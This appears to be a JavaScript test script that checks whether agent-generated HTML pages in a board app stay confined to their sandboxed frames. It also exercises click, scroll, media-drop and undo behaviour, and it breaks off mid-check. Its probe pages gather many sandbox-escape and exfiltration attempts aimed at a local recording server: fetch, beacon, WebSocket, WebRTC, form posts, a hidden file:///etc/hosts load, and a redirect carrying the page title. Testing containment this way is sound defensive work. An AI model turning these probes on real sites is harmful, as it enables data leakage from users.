/**
 * A free page can do whatever it likes inside its frame and nothing outside it (0.3-P2).
 *
 * The spike (RESULTS 0.3-P0 §1) aimed every request a page can make at a local server that only records
 * what reaches it; "blocked" meant the server saw nothing, not that the page said so. This does the same
 * against the browser build: an agent makes the probe page with one call, the board draws it, and the
 * server must stay empty. Then the person's side: one press selects a page and presses nothing inside
 * it, two presses go in, a press outside or Esc comes back out; selecting, moving and zooming on a board
 * of ten pages loads none of them again.
 *
 *   node scripts/verify-pages.mjs
 */
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import dgram from 'node:dgram';
import {openApp, openPage, runChecks, sleep, waitFor} from './lib/headless.mjs';
import {appPolicy} from '../src/csp.mjs';
import {framedDocument, renderShell} from '../src/free-page.ts';
import {mkdtempSync, writeFileSync, unlinkSync, rmdirSync, truncateSync, readdirSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {join} from 'node:path';

/** Files to drop from "the Finder", made here and removed when the gate ends. */
const filesDir = mkdtempSync(join(tmpdir(), 'aphrodite-pages-'));
const fileAt = name => join(filesDir, name);
const removeFiles = () => { try { for (const name of readdirSync(filesDir)) unlinkSync(fileAt(name)); rmdirSync(filesDir); } catch {} };

const PORT = 4223, TRAP = 4224;
const SERVER = `http://127.0.0.1:${TRAP}`;

/** A server that only records what reaches it. */
const hits = [];
const trap = createServer((req, res) => {
  hits.push({method: req.method, url: req.url, dest: req.headers['sec-fetch-dest'] ?? null});
  res.writeHead(200, {'content-type': 'text/plain', 'access-control-allow-origin': '*'});
  res.end('seen');
});
trap.on('upgrade', (req, socket) => { hits.push({method: 'UPGRADE', url: req.url}); socket.destroy(); });
await new Promise(resolve => trap.listen(TRAP, '127.0.0.1', resolve));
/** WebRTC goes out over UDP, which the HTTP server above never sees: a socket that counts what a page's STUN and TURN send it. */
const UDP = TRAP + 5;
const packets = [];
const udp = dgram.createSocket('udp4');
udp.on('message', message => packets.push(message.length));
await new Promise(resolve => udp.bind(UDP, '127.0.0.1', resolve));

const {evaluate, send, agent, personClicks, personPresses, presses, close} = await openApp({port: PORT, cdp: 9383, profile: '/tmp/aphrodite-pages-profile'});
const shut = () => { close(); trap.close(); udp.close(); removeFiles(); };
const checks = [];
const check = (name, fn) => checks.push([name, fn]);
const WHY = 'verify-pages: a free page stays in its frame.';
const revision = async () => (await agent('changes', {limit: 1})).revision;
const makePage = async (name, html, extra = {}) => {
  const made = await agent('apply', {reason: WHY, base_revision: await revision(), ops: [{op: 'html_page', name, html, ...extra}]});
  assert.ok(made.ok, JSON.stringify(made).slice(0, 400));
  return made.created_pages[0].page_id;
};

// Everything the app document is refused, from the first byte it loads.
await send('Page.enable', {});
await send('Page.addScriptToEvaluateOnNewDocument', {source: `window.__violations = []; document.addEventListener('securitypolicyviolation', e => window.__violations.push({directive: e.effectiveDirective, blocked: e.blockedURI, source: e.sourceFile}));
  window.__frameMessages = []; addEventListener('message', e => window.__frameMessages.push(e.data));`});
await send('Page.reload', {});
await sleep(500);
await waitFor(() => evaluate('!!window.aphroditeAgent && !!document.querySelector("#app")'), 'the app to boot again');
await send('Emulation.setDeviceMetricsOverride', {width: 1440, height: 900, deviceScaleFactor: 1, mobile: false});
const result = {};

check('the browser build is served under the policy src/csp.mjs gives it', async () => {
  const res = await fetch(`http://127.0.0.1:${PORT}/`);
  assert.equal(res.headers.get('content-security-policy'), appPolicy('browser'));
});

check('the app itself runs under that policy without being refused anything', async () => {
  await personClicks('welcome-sample');
  await waitFor(() => evaluate('!!document.querySelector(".space-frame.active [data-block-id]")'), 'the sample canvas');
  await sleep(1500);
  await personClicks('preview');
  await sleep(1200);
  await evaluate(`document.querySelector('[data-action="close-modal"]')?.click(), true`);
  const violations = await evaluate('window.__violations');
  assert.deepEqual(violations, [], JSON.stringify(violations));
  // The person opens the door, so the agent's pages below are written.
  await personPresses('agent-connect-toggle');
  await sleep(250);
  await presses('Escape');
  await sleep(5_200);
});

/** Every way out the spike found, each aimed at the recording server, plus the ones it named for later. */
const probe = (tag) => `<!doctype html><html><head><title>probe</title>
<link rel="stylesheet" href="${SERVER}/${tag}/link-css"><link rel="prefetch" href="${SERVER}/${tag}/prefetch">
<style>@font-face{font-family:x;src:url(${SERVER}/${tag}/font)} .bg{background:url(${SERVER}/${tag}/css-bg);font-family:x}</style>
<script src="${SERVER}/${tag}/script"></script></head><body>
<p class="bg">probe</p><img src="${SERVER}/${tag}/img"><img id="entity" src="&#104;ttp://127.0.0.1:${TRAP}/${tag}/entity-hidden"><img id="file" src="&#102;ile:///etc/hosts">
<video src="${SERVER}/${tag}/video"></video><svg><image href="${SERVER}/${tag}/svg-image"/></svg>
<iframe src="${SERVER}/${tag}/nested-frame"></iframe><object data="${SERVER}/${tag}/object"></object><embed src="${SERVER}/${tag}/embed">
<form id="f" action="${SERVER}/${tag}/form" method="post"><input name="a" value="b"></form>
<a id="ping" href="#here" ping="${SERVER}/${tag}/ping">ping</a><a id="hash" href="#here">hash</a><p id="here">here</p>
<script>
const report = (name, value) => parent.postMessage({probe: '${tag}', name, value: String(value)}, '*');
report('ran', true);
const tries = {
  fetch: () => fetch('${SERVER}/${tag}/fetch'),
  beacon: () => navigator.sendBeacon('${SERVER}/${tag}/beacon', 'x'),
  socket: () => new WebSocket('ws://127.0.0.1:${TRAP}/${tag}/socket'),
  events: () => new EventSource('${SERVER}/${tag}/event-source'),
  xhr: () => { const x = new XMLHttpRequest(); x.open('GET', '${SERVER}/${tag}/xhr'); x.send(); },
  worker: () => new Worker('data:text/javascript,fetch("${SERVER}/${tag}/worker")'),
  module: () => import('${SERVER}/${tag}/module.js'),
  storage: () => localStorage.getItem('x'),
  parentDom: () => parent.document.title,
  popup: () => window.open('${SERVER}/${tag}/popup'),
  top: () => { top.location.href = '${SERVER}/${tag}/top'; },
  form: () => document.getElementById('f').submit(),
  ping: () => document.getElementById('ping').click(),
  hash: () => document.getElementById('hash').click(),
  appAddress: () => setTimeout(() => location.assign(new URL('#away', document.baseURI)), 600),
  refresh: () => setTimeout(() => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${SERVER}/${tag}/refresh'; document.head.append(m); }, 800),
  self: () => setTimeout(() => { location.href = '${SERVER}/${tag}/self-after-1s?d=' + encodeURIComponent(document.title); }, 1000),
};
for (const [name, run] of Object.entries(tries)) { try { const out = run(); if (out && out.catch) out.catch(e => report(name, 'refused: ' + e.message)); report(name, 'tried'); } catch (e) { report(name, 'refused: ' + e.message); } }
addEventListener('load', () => report('entity-hidden-file', document.getElementById('file').naturalWidth));
</script></body></html>`;

/**
 * WebRTC and every other way a page could get a window of its own to call out from: a peer connection
 * here, and in a frame it makes (srcdoc, parsed markup, a javascript: address, inside an open and a
 * closed shadow root), a worker, WebTransport. Each reports to the top window, which hears every frame.
 */
const rtcProbe = tag => {
  const nested = name => `try{const pc=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:${UDP}"}]});pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o)).then(()=>top.postMessage({rtc:"${tag}",name:"${name}",value:"offer made"},"*"))}catch(e){top.postMessage({rtc:"${tag}",name:"${name}",value:"refused"},"*")}`;
  const attr = s => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
  return `<!doctype html><title>rtc</title><p>rtc</p><script>
const say = (name, value) => top.postMessage({rtc: '${tag}', name, value: String(value)}, '*');
say('ran', true);
(async () => { try { const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:127.0.0.1:${UDP}'}, {urls: 'turn:127.0.0.1:${UDP}', username: 'u', credential: 'p'}]}); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); say('here', 'offer made'); } catch (e) { say('here', 'refused'); } })();
try { const C = window.webkitRTCPeerConnection; say('webkit-prefixed', C ? 'present' : 'refused'); } catch (e) { say('webkit-prefixed', 'refused'); }
try { navigator.mediaDevices.enumerateDevices().then(() => say('media-devices', 'present'), () => say('media-devices', 'refused')); } catch (e) { say('media-devices', 'refused'); }
try { const t = new WebTransport('https://127.0.0.1:${UDP}/'); t.ready.then(() => say('webtransport', 'ready'), () => say('webtransport', 'refused')); } catch (e) { say('webtransport', 'refused'); }
try { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(typeof RTCPeerConnection)'], {type: 'text/javascript'}))); w.onmessage = e => say('worker', e.data); w.onerror = () => say('worker', 'refused'); } catch (e) { say('worker', 'refused'); }
{ const f = document.createElement('iframe'); f.srcdoc = '<script>${nested('srcdoc')}<\\/script>'; document.body.append(f); }
{ const d = document.createElement('div'); d.innerHTML = '<iframe srcdoc="<script>${attr(nested('parsed'))}<\\/script>"></iframe>'; document.body.append(d); }
{ const f = document.createElement('iframe'); f.src = 'javascript:"<script>${nested('javascript').replace(/"/g, '\\\\x22')}<\\/script>"'; document.body.append(f); }
try { const h = document.createElement('div'); document.body.append(h); h.attachShadow({mode: 'closed'}).innerHTML = '<iframe srcdoc="<script>${attr(nested('shadow'))}<\\/script>"></iframe>'; } catch (e) { say('shadow', 'refused'); }
{ const d = document.createElement('div'); if (d.setHTMLUnsafe) { d.setHTMLUnsafe('<div><template shadowrootmode="closed"><iframe srcdoc="<script>${attr(nested('declarative'))}<\\/script>"></iframe></template></div>'); document.body.append(d); } }
</script><iframe srcdoc="<script>${attr(nested('markup'))}</script>"></iframe><div><template shadowrootmode="closed"><iframe srcdoc="<script>${attr(nested('markup-declarative'))}</script>"></iframe></template></div></html>`;
};
const rtcSaid = tag => evaluate(`window.__frameMessages.filter(m => m && m.rtc === '${tag}').map(m => m.name + '=' + m.value)`);

check('a page reaches nothing over WebRTC, nor from a frame or a worker of its own', async () => {
  const before = packets.length;
  await makePage('RTC probe', rtcProbe('board'));
  await waitFor(async () => (await rtcSaid('board')).includes('ran=true'), 'the WebRTC probe to run', 20);
  await sleep(4000);
  const said = await rtcSaid('board');
  result.rtcBoard = {udp: packets.length - before, said};
  assert.deepEqual(said.filter(s => /offer made|present|ready|function/.test(s)), [], 'nothing it tried worked');
  assert.equal(packets.length - before, 0, `UDP packets reached the socket: ${packets.length - before}`);
});

/** A page that takes the host's script out before it tries anything, so nothing below leans on it. */
const bare = probe('bare').replace('<script>\nconst report', `<script>
for (const s of [...document.scripts]) if (s !== document.currentScript) s.remove();
addEventListener('click', e => e.stopImmediatePropagation(), true);
const report`);

for (const [tag, html] of [['probe', probe('probe')], ['bare', bare]]) {
  check(`${tag === 'probe' ? 'a page' : 'a page that takes out the host script'} reaches nothing outside, whatever it tries`, async () => {
    const before = hits.length;
    const url = await evaluate('location.href');
    const id = await makePage(`Probe ${tag}`, html);
    await waitFor(() => evaluate(`window.__frameMessages.some(m => m && m.probe === '${tag}' && m.name === 'ran')`), `the ${tag} page to run in its frame`, 20);
    await sleep(2500);
    const seen = hits.slice(before);
    result[tag] = {tried: (await evaluate(`window.__frameMessages.filter(m => m && m.probe === '${tag}').map(m => m.name + '=' + m.value)`)), reached: seen};
    assert.deepEqual(seen, [], `the server was reached: ${JSON.stringify(seen)}`);
    assert.equal(await evaluate('location.href'), url, 'the app stayed where it was');
    assert.equal(await evaluate(`!!document.querySelector('[data-page-id="${id}"] iframe')`), true, 'the frame is still on the board');
    assert.equal(await evaluate(`window.__frameMessages.find(m => m && m.probe === '${tag}' && m.name === 'entity-hidden-file')?.value`), '0', 'a file: address hidden behind an entity loads nothing');
  });
}

/* The off-screen renderer loads a page of its own, top level, from the loopback bridge (src-tauri/src/
   snapshot.rs). Served the same way here, the shell must keep the probe from reaching anything, its
   one-second move out of the frame included (RESULTS 0.3-P0 §4: on 11/18 the render window left). A
   listener is added beside the shell for this check only, to hear the probe start. */
check('the page the off-screen renderer loads keeps the probe from reaching anything', async () => {
  const before = hits.length;
  const listener = `<script>window.__m = []; addEventListener('message', e => window.__m.push(e.data));</script>`;
  const shell = renderShell(framedDocument(probe('render'), {media: () => undefined, origins: []}), []).replace('<iframe', listener + '<iframe');
  const server = createServer((req, res) => { res.writeHead(200, {'content-type': 'text/html; charset=utf-8'}); res.end(shell); });
  await new Promise(resolve => server.listen(TRAP + 2, '127.0.0.1', resolve));
  const page = await openPage(`http://127.0.0.1:${TRAP + 2}/render/once`, {cdp: 9384, profile: '/tmp/aphrodite-pages-render-profile'});
  try {
    await waitFor(() => page.evaluate(`window.__m.some(m => m && m.probe === 'render' && m.name === 'ran')`), 'the probe to run in the render page', 20);
    await sleep(2500);
    const seen = hits.slice(before);
    result.render = {reached: seen, url: await page.evaluate('location.href')};
    assert.deepEqual(seen, [], `the server was reached: ${JSON.stringify(seen)}`);
    assert.equal(await page.evaluate('location.pathname'), '/render/once', 'the render page stayed where it was');
  } finally { page.close(); server.close(); }
});

check('the page the off-screen renderer loads reaches nothing over WebRTC either', async () => {
  const before = packets.length;
  const listener = `<script>window.__m = []; addEventListener('message', e => window.__m.push(e.data));</script>`;
  const shell = renderShell(framedDocument(rtcProbe('render'), {media: () => undefined, origins: []}), []).replace('<iframe', listener + '<iframe');
  const server = createServer((req, res) => { res.writeHead(200, {'content-type': 'text/html; charset=utf-8'}); res.end(shell); });
  await new Promise(resolve => server.listen(TRAP + 3, '127.0.0.1', resolve));
  const page = await openPage(`http://127.0.0.1:${TRAP + 3}/render/rtc`, {cdp: 9385, profile: '/tmp/aphrodite-pages-render-profile'});
  try {
    await waitFor(() => page.evaluate(`window.__m.some(m => m && m.rtc === 'render' && m.name === 'ran')`), 'the probe to run in the render page', 20);
    await sleep(4000);
    const said = await page.evaluate(`window.__m.filter(m => m && m.rtc === 'render').map(m => m.name + '=' + m.value)`);
    result.rtcRender = {udp: packets.length - before, said};
    assert.deepEqual(said.filter(s => /offer made|present|ready|function/.test(s)), []);
    assert.equal(packets.length - before, 0, `UDP packets reached the socket: ${packets.length - before}`);
  } finally { page.close(); server.close(); }
});

/* ---- the person's side: one press selects, two go in, a press outside or Esc comes out ---- */

const mouse = (type, p, extra = {}) => send('Input.dispatchMouseEvent', {type, x: p.x, y: p.y, button: 'left', clickCount: 1, ...extra});
const click = async (p, count = 1) => {
  await mouse('mouseMoved', p, {button: 'none'});
  for (let n = 1; n <= count; n++) { await mouse('mousePressed', p, {buttons: 1, clickCount: n}); await mouse('mouseReleased', p, {clickCount: n}); }
  await sleep(350);
};
const seq = async () => (await agent('changes', {limit: 1, include_view: true})).seq;
const camera = () => evaluate('document.querySelector("#app").dataset.camera');
const active = () => evaluate('document.querySelector(".space-frame.active")?.dataset.pageId');
const entered = id => evaluate(`(() => { const s = document.querySelector('[data-page-id="${id}"]'); return s.classList.contains('entered') && !s.querySelector('iframe').inert; })()`);
/** A point inside a free page, in the page's own pixels, wherever the camera has it. */
const inPage = (id, x, y) => evaluate(`(() => { const r = document.querySelector('[data-page-id="${id}"] .board-item').getBoundingClientRect(); const z = Number(document.querySelector('#app').dataset.camera.split(',')[2]); return {x: r.left + ${x} * z, y: r.top + ${y} * z}; })()`);
const messages = (key) => evaluate(`window.__frameMessages.filter(m => m && m[${JSON.stringify(key)}] !== undefined).map(m => m[${JSON.stringify(key)}])`);
const pressed = async () => (await messages('pressed')).at(-1) ?? 0;
const emptySpot = () => evaluate(`(() => { const s = document.querySelector('#canvas-scroll').getBoundingClientRect(); const frames = [...document.querySelectorAll('.space-frame')].map(f => f.getBoundingClientRect());
  for (let y = s.top + 20; y < s.bottom - 20; y += 10) for (let x = s.left + 20; x < s.right - 20; x += 10) { if (frames.some(r => x >= r.left - 8 && x <= r.right + 8 && y >= r.top - 40 && y <= r.bottom + 8)) continue;
    const hit = document.elementFromPoint(x, y); if (hit && (hit.id === 'canvas-scroll' || hit.id === 'space-world')) return {x, y}; } return null; })()`);
let enterId, sampleId;

check('one press on a free page selects it, and presses nothing inside it', async () => {
  sampleId = await evaluate('document.querySelector(".space-frame.active").dataset.pageId');
  const html = `<!doctype html><html><body style="margin:0;height:3000px;font:16px sans-serif">
<button id="b" style="position:fixed;left:20px;top:20px;width:240px;height:80px">Pressed <b id="n">0</b></button>
<a id="out" href="https://example.com/outside" style="position:fixed;left:20px;top:140px;display:block;width:240px;height:40px">outside</a>
<a id="hash" href="#far" style="position:fixed;left:20px;top:200px;display:block;width:240px;height:40px">far down</a>
<a id="pg" href="page:${sampleId}" style="position:fixed;left:20px;top:260px;display:block;width:240px;height:40px">the sample</a>
<p id="far" style="position:absolute;top:2500px">far</p>
<script>parent.postMessage({boot: 'enter'}, '*'); let n = 0; document.getElementById('b').onclick = () => { n++; document.getElementById('n').textContent = n; parent.postMessage({pressed: n}, '*'); }; addEventListener('scroll', () => parent.postMessage({scrolled: scrollY}, '*'));</script></body></html>`;
  enterId = await makePage('Press test', html, {width: 800, height: 600});
  await waitFor(async () => (await messages('boot')).includes('enter'), 'the page to start');
  await personClicks('zoom-fit');
  await sleep(500);
  assert.equal(await active(), sampleId, 'the sample is the page being looked at');
  const before = await seq();
  await click(await inPage(enterId, 140, 60));
  assert.equal(await active(), enterId, 'the press selected the free page');
  assert.equal(await pressed(), 0, 'and pressed nothing inside it');
  assert.equal(await entered(enterId), false);
  assert.equal(await seq(), before + 1, 'selecting a page is the one view change it always was');
});

check('two presses go in, and a press inside reaches the page', async () => {
  const before = await seq();
  await click(await inPage(enterId, 140, 60), 2);
  assert.equal(await entered(enterId), true, 'in');
  await click(await inPage(enterId, 140, 60));
  assert.equal(await pressed(), 1, 'the button inside was pressed once');
  assert.equal(await seq(), before, 'going in is not an edit');
});

check('a press outside comes back out, and the same press on the page presses nothing', async () => {
  await click(await emptySpot());
  assert.equal(await entered(enterId), false, 'out');
  await click(await inPage(enterId, 140, 60));
  assert.equal(await pressed(), 1, 'still one press');
});

check('outside the page the wheel moves the board; inside it, the page', async () => {
  const at = await inPage(enterId, 400, 400);
  let was = await camera();
  await send('Input.dispatchMouseEvent', {type: 'mouseWheel', x: at.x, y: at.y, deltaX: 0, deltaY: 120});
  await sleep(300);
  assert.notEqual(await camera(), was, 'the board moved');
  await click(await inPage(enterId, 140, 60), 2);
  assert.equal(await entered(enterId), true);
  was = await camera();
  const inside = await inPage(enterId, 400, 400);
  await send('Input.dispatchMouseEvent', {type: 'mouseWheel', x: inside.x, y: inside.y, deltaX: 0, deltaY: 300});
  await sleep(400);
  assert.equal(await camera(), was, 'the board stayed');
  assert.ok((await messages('scrolled')).some(y => y > 0), 'the page scrolled');
});

check('Esc typed inside the page comes back out', async () => {
  await click(await inPage(enterId, 140, 60));
  assert.equal(await pressed(), 2);
  await send('Input.dispatchKeyEvent', {type: 'rawKeyDown', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27});
  await send('Input.dispatchKeyEvent', {type: 'keyUp', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27});
  await sleep(300);
  assert.equal(await entered(enterId), false);
});

check('a link to #somewhere scrolls inside the page instead of loading the app into it', async () => {
  await click(await inPage(enterId, 140, 60), 2);
  const scrolled = (await messages('scrolled')).length;
  await click(await inPage(enterId, 140, 220));
  await sleep(300);
  assert.ok((await messages('scrolled')).slice(scrolled).some(y => y > 1500), 'scrolled to the far paragraph');
  assert.deepEqual(await messages('boot'), ['enter'], 'the page did not start again');
});

check('a link to page:<id> shows that page on the board and changes nothing', async () => {
  const before = await seq(), was = await camera();
  await click(await inPage(enterId, 140, 280));
  await sleep(400);
  assert.notEqual(await camera(), was, 'the board moved to the page');
  assert.equal(await seq(), before, 'nothing was recorded');
});

check('a link out of the app is only shown to the person, with the address, until they press Open', async () => {
  await personClicks('zoom-fit');
  await sleep(500);
  await click(await inPage(enterId, 140, 60), 2);
  const targets = async () => (await send('Target.getTargets', {})).result.targetInfos.filter(t => t.type === 'page').length;
  const pages = await targets();
  await click(await inPage(enterId, 140, 160));
  await sleep(400);
  assert.equal(await evaluate(`document.querySelector('#modal-root')?.textContent.includes('https://example.com/outside')`), true, 'the address is shown');
  assert.equal(await targets(), pages, 'nothing was opened');
  await evaluate(`document.querySelector('[data-action="close-modal"]')?.click(), true`);
});

check('Preview shows a free page running, in the same kind of frame', async () => {
  await evaluate(`document.querySelector('[data-action="close-modal"]')?.click(), true`);
  assert.equal(await active(), enterId);
  const boots = (await messages('boot')).length;
  await personClicks('preview');
  await waitFor(async () => (await messages('boot')).length > boots, 'the page to start in Preview');
  const frame = await evaluate(`(() => { const f = document.querySelector('#modal-root iframe'); return f && {sandbox: f.getAttribute('sandbox'), page: f.dataset.framePage}; })()`);
  assert.deepEqual(frame, {sandbox: 'allow-scripts', page: enterId});
  await sleep(800); // the dialog's opening motion
  const at = await evaluate(`(() => { const r = document.querySelector('#modal-root iframe').getBoundingClientRect(); return {x: r.left + 140, y: r.top + 60}; })()`);
  const was = (await messages('pressed')).length;
  await click(at);
  assert.deepEqual((await messages('pressed')).slice(was), [1], 'the button in Preview was pressed, in a page of its own');
  await send('Input.dispatchKeyEvent', {type: 'rawKeyDown', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27});
  await send('Input.dispatchKeyEvent', {type: 'keyUp', key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27});
  await sleep(300);
  assert.equal(await evaluate(`!document.querySelector('#modal-root iframe')`), true, 'Esc inside Preview closes it');
});

/* ---- pictures and videos: dropped, pasted, played, shown inside a page, taken back ---- */

const dropFiles = async (names, p) => {
  await send('Input.dispatchMouseEvent', {type: 'mouseMoved', x: p.x, y: p.y});
  const data = {items: [], files: names.map(fileAt), dragOperationsMask: 1};
  for (const type of ['dragEnter', 'dragOver', 'drop']) await send('Input.dispatchDragEvent', {type, x: p.x, y: p.y, data});
};
const mediaItems = () => evaluate(`[...document.querySelectorAll('.board-media')].map(m => { const el = m.querySelector('img,video'); return {page: m.closest('.space-frame').dataset.pageId, tag: el.tagName, ready: el.tagName === 'IMG' ? el.naturalWidth : el.readyState}; })`);
let dropped = [];

check('a screenshot and an mp4 dropped from the Finder land on the board as one change, the person’s', async () => {
  // Made in the browser by code: a picture on a canvas, and two seconds of video recorded from it.
  const made = await evaluate(`(async () => {
    const c = document.createElement('canvas'); c.width = 1280; c.height = 800; const g = c.getContext('2d');
    const paint = t => { g.fillStyle = '#f4f1ea'; g.fillRect(0, 0, 1280, 800); g.fillStyle = '#2f4cd8'; g.fillRect(80 + t * 6, 120, 360, 240); g.fillStyle = '#1f2937'; g.font = '48px sans-serif'; g.fillText('Board screenshot · ' + t, 80, 520); };
    paint(0);
    const png = await new Promise(r => c.toBlob(r, 'image/png'));
    const type = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
    const rec = new MediaRecorder(c.captureStream(15), {mimeType: type}); const parts = []; rec.ondataavailable = e => parts.push(e.data);
    rec.start(); for (let t = 0; t < 30; t++) { paint(t); await new Promise(r => setTimeout(r, 66)); } rec.stop(); await new Promise(r => rec.onstop = r);
    const b64 = async b => { const s = new Uint8Array(await b.arrayBuffer()); let out = ''; for (let i = 0; i < s.length; i += 32768) out += String.fromCharCode(...s.subarray(i, i + 32768)); return btoa(out); };
    return {png: await b64(png), video: await b64(new Blob(parts, {type})), ext: type === 'video/mp4' ? 'mp4' : 'webm'};
  })()`);
  writeFileSync(fileAt('screenshot.png'), Buffer.from(made.png, 'base64'));
  writeFileSync(fileAt(`clip.${made.ext}`), Buffer.from(made.video, 'base64'));
  result.videoKind = made.ext;
  await personClicks('zoom-fit');
  await sleep(400);
  const before = await seq();
  await dropFiles(['screenshot.png', `clip.${made.ext}`], await emptySpot());
  await waitFor(async () => (await seq()) > before, 'the files on the board', 30);
  const {changes} = await agent('changes', {since: before, include_view: true, limit: 5});
  assert.equal(changes.length, 1, 'one change');
  assert.deepEqual(changes[0].author, {kind: 'person', name: 'you'});
  assert.equal(changes[0].source, 'media:drop');
  await waitFor(async () => (await mediaItems()).filter(m => m.ready > 0).length === 2, 'the picture and the video to load', 30);
  dropped = (await mediaItems()).map(m => m.page);
  const contract = await agent('contract', {});
  const items = contract.pages.filter(p => dropped.includes(p.page_id));
  result.dropped = items.map(p => p.media);
  assert.equal(items.length, 2);
  for (const item of items) assert.match(item.media.src, /^media:[0-9a-f]{64}$/, 'named by its hash, not by a place on this machine');
});

check('with a picture selected, adding a component changes nothing and says why', async () => {
  const shot = (await mediaItems()).find(m => m.tag === 'IMG').page;
  await personPresses('page', {id: shot});
  await sleep(300);
  assert.equal(await active(), shot, 'the picture is the page being looked at');
  const before = await seq();
  await personPresses('add', {kind: 'cta'});
  await sleep(400);
  assert.equal(await seq(), before, 'nothing was added');
  assert.match(await evaluate(`document.querySelector('#toast').textContent`), /picture or a video, which has no sections|그림·영상에는 섹션이 없습니다/);
});

check('a file past what a board holds, or of another kind, is refused with its reason, and nothing lands', async () => {
  writeFileSync(fileAt('notes.txt'), 'not a picture');
  writeFileSync(fileAt('huge.mp4'), Buffer.from([0, 0, 0, 0x20, ...Buffer.from('ftypisom')]));
  truncateSync(fileAt('huge.mp4'), 500 * 1024 * 1024 + 1);
  const before = await seq();
  await dropFiles(['notes.txt', 'huge.mp4'], await emptySpot());
  await sleep(1200);
  const said = await evaluate(`document.querySelector('#toast').textContent`);
  assert.match(said, /notes\.txt is not a PNG, JPEG, GIF, WebP, MP4 or WebM/);
  assert.match(said, /huge\.mp4 is 501 MB; a file on a board holds at most 500 MB/);
  assert.equal(await seq(), before, 'nothing was placed');
});

check('pressing play plays the video, and selecting other pages leaves it playing', async () => {
  const video = (await mediaItems()).find(m => m.tag === 'VIDEO').page;
  const play = await evaluate(`(() => { const r = document.querySelector('[data-board-play="${video}"]').getBoundingClientRect(); return {x: r.left + r.width / 2, y: r.top + r.height / 2}; })()`);
  await click(play);
  await sleep(600);
  await evaluate(`(document.querySelector('[data-page-id="${video}"] video').__mark = 1, true)`);
  assert.equal(await evaluate(`!document.querySelector('[data-page-id="${video}"] video').paused`), true, 'playing');
  const t0 = await evaluate(`document.querySelector('[data-page-id="${video}"] video').currentTime`);
  await click(await inPage(enterId, 140, 60));
  await sleep(500);
  const now = await evaluate(`(() => { const v = document.querySelector('[data-page-id="${video}"] video'); return {mark: v.__mark, paused: v.paused, t: v.currentTime}; })()`);
  assert.equal(now.mark, 1, 'the same video element');
  assert.equal(now.paused, false, 'still playing');
  assert.ok(now.t > t0, 'and moving on');
});

check('a page shows a board picture it names as media:<sha256>', async () => {
  const contract = await agent('contract', {});
  const shot = contract.pages.find(p => dropped.includes(p.page_id) && p.media.mime === 'image/png').media.src;
  await makePage('Uses the screenshot', `<img id="i" src="${shot}" style="width:400px"><script>addEventListener('load', () => parent.postMessage({shotWidth: document.getElementById('i').naturalWidth}, '*'))</script>`, {width: 800, height: 600});
  await waitFor(async () => (await messages('shotWidth')).length, 'the page to load its picture', 20);
  assert.equal((await messages('shotWidth')).at(-1), 1280);
});

check('a picture pasted with ⌘V lands as the person’s', async () => {
  await send('Emulation.setFocusEmulationEnabled', {enabled: true});
  await send('Browser.grantPermissions', {permissions: ['clipboardReadWrite', 'clipboardSanitizedWrite'], origin: `http://127.0.0.1:${PORT}`});
  await evaluate(`(async () => { const c = document.createElement('canvas'); c.width = 600; c.height = 400; const g = c.getContext('2d'); g.fillStyle = '#c9a75a'; g.fillRect(0, 0, 600, 400); const b = await new Promise(r => c.toBlob(r, 'image/png')); await navigator.clipboard.write([new ClipboardItem({'image/png': b})]); document.activeElement?.blur(); return true; })()`);
  const before = await seq();
  await send('Input.dispatchKeyEvent', {type: 'rawKeyDown', key: 'v', code: 'KeyV', modifiers: 4, windowsVirtualKeyCode: 86, commands: ['paste']});
  await send('Input.dispatchKeyEvent', {type: 'keyUp', key: 'v', code: 'KeyV', modifiers: 4, windowsVirtualKeyCode: 86});
  await waitFor(async () => (await seq()) > before, 'the pasted picture', 20);
  const {changes} = await agent('changes', {since: before, include_view: true, limit: 5});
  assert.equal(changes.length, 1);
  assert.deepEqual([changes[0].author.kind, changes[0].source], ['person', 'media:paste']);
});

check('⌘Z takes a paste back off the board', async () => {
  const count = (await mediaItems()).length;
  await send('Input.dispatchKeyEvent', {type: 'rawKeyDown', key: 'z', code: 'KeyZ', modifiers: 4, windowsVirtualKeyCode: 90});
  await send('Input.dispatchKeyEvent', {type: 'keyUp', key: 'z', code: 'KeyZ', modifiers: 4, windowsVirtualKeyCode: 90});
  await sleep(600);
  assert.equal((await mediaItems()).length, count - 1);
});

check('an agent’s media_add in the browser build is refused with the reason, and nothing moves', async () => {
  await sleep(5_200); // the person's keys hold the screen for five seconds
  const before = await seq();
  const got = await agent('apply', {reason: WHY, base_revision: await revision(), ops: [{op: 'media_add', path: '/tmp/x.png'}]});
  assert.match(got.error ?? '', /browser build cannot read files/);
  assert.equal(await seq(), before);
});

/* 0.3-P2: on a board of ten pages, selecting, moving a frame and zooming load none of them again.
   Each page says hello once each time it starts. */
check('on a board of ten pages, selecting, moving and zooming load none of them again', async () => {
  const boots = async () => (await messages('ten')).length;
  await sleep(5_200);
  const ops = Array.from({length: 10}, (_, i) => ({op: 'html_page', name: `Ten ${i + 1}`, html: `<h1>Page ${i + 1}</h1><script>parent.postMessage({ten: ${i}}, '*')</script>`, width: 800, height: 500}));
  const made = await agent('apply', {reason: WHY, base_revision: await revision(), ops});
  assert.ok(made.ok, JSON.stringify(made).slice(0, 300));
  await waitFor(async () => (await boots()) === 10, 'ten pages to start', 30);
  await personClicks('zoom-fit');
  await sleep(500);
  const ids = made.created_pages.map(p => p.page_id);
  for (const id of ids.slice(0, 4)) await click(await inPage(id, 100, 100));
  const handle = await evaluate(`(() => { const r = document.querySelector('[data-page-id="${ids[5]}"] .frame-name').getBoundingClientRect(); return {x: r.left + 10, y: r.top + r.height / 2}; })()`);
  await mouse('mouseMoved', handle, {button: 'none'}); await mouse('mousePressed', handle, {buttons: 1});
